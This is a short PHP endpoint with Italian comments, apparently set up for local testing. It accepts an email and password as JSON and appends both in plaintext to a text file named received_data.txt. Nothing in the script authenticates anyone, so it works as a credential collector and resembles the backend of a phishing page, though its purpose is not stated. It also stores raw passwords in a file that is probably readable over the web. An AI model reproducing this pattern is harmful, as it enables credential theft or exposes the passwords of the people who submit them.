<?php
// Imposta l'header per consentire richieste da origini diverse (per test locali)
// Imposta gli header per gestire CORS
header("Access-Control-Allow-Origin: http://127.0.0.1:5500");
header("Access-Control-Allow-Methods: POST, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type");

// Gestione della richiesta preflight (OPTIONS)
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200); // Risposta OK per il preflight
    exit();
}
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Leggi i dati JSON dalla richiesta
    $jsonData = file_get_contents('php://input');
    $data = json_decode($jsonData, true);

    // Verifica che i dati siano validi
    if (isset($data['email']) && isset($data['password'])) {
        // Formatta i dati per il file di testo
        $email = htmlspecialchars($data['email']);
        $password = htmlspecialchars($data['password']);
        $entry = "Email: $email | Password: $password\n";

        // Specifica il percorso del file
        $filePath = 'received_data.txt';

        // Salva i dati nel file di testo
        if (file_put_contents($filePath, $entry, FILE_APPEND)) {
            // Risposta di successo
            http_response_code(200);
            echo json_encode(["message" => "Dati salvati con successo."]);
        } else {
            // Errore durante il salvataggio
            http_response_code(500);
            echo json_encode(["message" => "Errore durante il salvataggio dei dati."]);
        }
    } else {
        // Dati non validi
        http_response_code(400);
        echo json_encode(["message" => "Dati mancanti o non validi."]);
    }
} else {
    // Metodo non consentito
    http_response_code(405);
    echo json_encode(["message" => "Metodo non consentito."]);
}
?>
